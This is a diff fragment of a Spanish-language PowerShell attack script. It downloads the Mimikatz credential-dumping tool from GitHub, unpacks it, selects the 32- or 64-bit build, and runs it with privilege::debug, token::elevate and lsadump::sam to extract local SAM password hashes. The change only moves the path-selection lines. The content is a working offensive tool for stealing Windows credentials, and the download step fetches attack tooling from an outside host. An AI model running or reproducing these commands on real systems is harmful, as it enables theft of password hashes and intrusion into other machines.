@@ -83,14 +83,16 @@ $AllProtocols = [System.Net.SecurityProtocolType]'Ssl3,Tls,Tls11,Tls12'
         Write-Host "Sistema de $system detectado, descargando Mimikatz.." -ForegroundColor Green 
 	EnableTLS ; Invoke-WebRequest -Uri "https://github.com/gentilkiwi/mimikatz/releases/download/2.1.1-20180820/mimikatz_trunk.zip" -Outfile mimikatz.zip
 	Expand-Archive .\mimikatz.zip -Force
+	if($system -in '32 bits') { $mimipath = ".\mimikatz\Win32\" }
+	if($system -in '64 bits') { $mimipath = ".\mimikatz\x64\" }
+	
+	
 	Write-Host ""
         $hash = Read-Host -Prompt 'Quieres usar un hash local?'
 	Write-Host ""
         if($hash -like 's*') { 
         Write-Host "Recuperando hashes locales.." -ForegroundColor Magenta
         Write-Host ""
-	if($system -in '32 bits') { $mimipath = ".\mimikatz\Win32\" }
-	if($system -in '64 bits') { $mimipath = ".\mimikatz\x64\" }
 	$Host.UI.RawUI.ForegroundColor = 'Yellow'
 	powershell $mimipath\mimikatz.exe privilege::debug token::elevate lsadump::sam exit
         $Host.UI.RawUI.ForegroundColor = 'Gray'
